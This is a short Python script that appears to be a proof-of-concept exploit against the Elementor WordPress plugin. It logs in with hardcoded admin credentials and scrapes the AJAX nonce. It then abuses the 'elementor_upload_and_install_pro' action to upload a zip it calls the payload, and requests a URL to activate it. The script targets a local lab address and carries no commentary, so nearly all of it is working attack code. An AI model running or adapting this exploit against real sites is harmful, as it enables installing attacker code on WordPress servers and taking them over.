import requests
import re

payload = "elementor-pro.zip"
baseUrl = "http://localhost/laboratorio/"
userName = "admin"
passWord = "123"

session = requests.Session()
cookies = {'WP_test_cookie': 'Cookie+check'}


def loginWP(UserName, PassWord):
    global cookies

    loginUrl = baseUrl + 'wp-login.php'
    admUrl = baseUrl + 'wp-admin/&reauth=1'

    data = {'log': UserName, 'pwd': PassWord,
        'redirect_to': admUrl, 'testcookie': 1}



    regexp = re.compile('"ajax":\\{"url":".+admin\\-ajax\\.php","nonce":"(.+)"\\},"finder":\\{(.+)}') 

    response = session.post(loginUrl, cookies=cookies, data=data)

    r = session.get(admUrl)

    search = regexp.search(r.text)
    #print(r.text) 
    if not search:
        print('Error - Invalid credentials?')
    else: 
        return search.group(1)


def UploadFile(fileName, nonce): 
    
    uploadUrl = baseUrl + 'wp-admin/admin-ajax.php'
    data = { 'action' : 'elementor_upload_and_install_pro', 'nonce' : nonce, '_nonce' : nonce}
    files = { 'fileToUpload' : open(fileName, 'rb') }
    regexp = re.compile('"elementorProInstalled":true') 
    
    response = session.post(uploadUrl, data=data, files=files)
    
    print(response.text)

    search = regexp.search(response.text)
   
    if not search:
        print ('Error - Upload failed')
        return False
    else:
        print ('Upload completed successfully!') 
        return True

def ActivatePayload(): 
    payloadUrl = baseUrl + 'index.php?activate=1' 
    session.get(payloadUrl)  
    print(payloadUrl)



nonce = loginWP(userName, passWord)  

fileUploaded = UploadFile(payload, nonce)  

if fileUploaded: 
    print ('Activating payload...') 
    ActivatePayload()